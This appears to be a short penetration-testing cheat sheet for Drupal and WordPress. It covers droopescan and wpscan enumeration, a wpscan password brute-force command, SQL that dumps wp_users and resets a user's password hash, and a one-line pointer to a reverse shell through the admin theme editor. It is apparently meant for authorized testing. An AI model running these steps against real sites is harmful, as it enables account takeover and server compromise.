Drupal:
---
#drupal #droopescan

```bash
droopescan
```

WordPress WPSCAN:
---
#wpscan #wordpress 

```bash
wpscan --url $TARGET_URL
```

enumerate plugins, themes, users

```bash
wpscan --url $TARGET_URL --enumerate p,t,u
```

brute force password for single user using wordlists:

```bash
wpscan --url $TARGET_URL -P $DICTIONARY_FILE --usernames $USERNAME
```

```bash
wpscan --url $TARGET_URL --enumerate p --plugins-detection aggressive
```

Ignore SSL cert ( HTTPS Error )

```bash
--disable-tls-checks
```

Extract WORDPRESS credentials using SQL:
---
#wordpress #sql

```sql
use wordpress;
select * from wp_users;
```

Set user's password to 'test' in WordPress:
---
#wordpress #sql

```sql
UPDATE `wp_users` SET `user_pass` = '$P$B5KVeQQgz6hVpQVjcC5uyy81LMPETa0' WHERE user_login = '$USER'
```

**Reverse shell abusing the WordPress Admin account:**
---
#wordpress #editor #exploit

appearance -> editor > index.php > revshell